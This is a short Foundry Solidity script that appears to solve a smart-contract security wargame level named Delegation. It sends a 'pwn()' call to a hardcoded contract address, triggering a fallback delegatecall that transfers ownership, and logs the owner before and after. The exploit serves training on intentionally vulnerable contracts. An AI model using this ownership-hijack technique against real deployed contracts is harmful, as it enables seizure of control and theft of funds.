// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "@contracts/Level06.sol";

contract Level6Script is Script {
    Delegation level6 = Delegation(0xd431362aDF783D3C0c2808659c91A570B11A9c81);

    function run() external {
        vm.startBroadcast();

        console.log("owner before: ", level6.owner());
        (bool sent, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
        require(sent, "smart contract call didn't go through successfully");
        console.log("owner after: ", level6.owner());

        vm.stopBroadcast();
    }
}
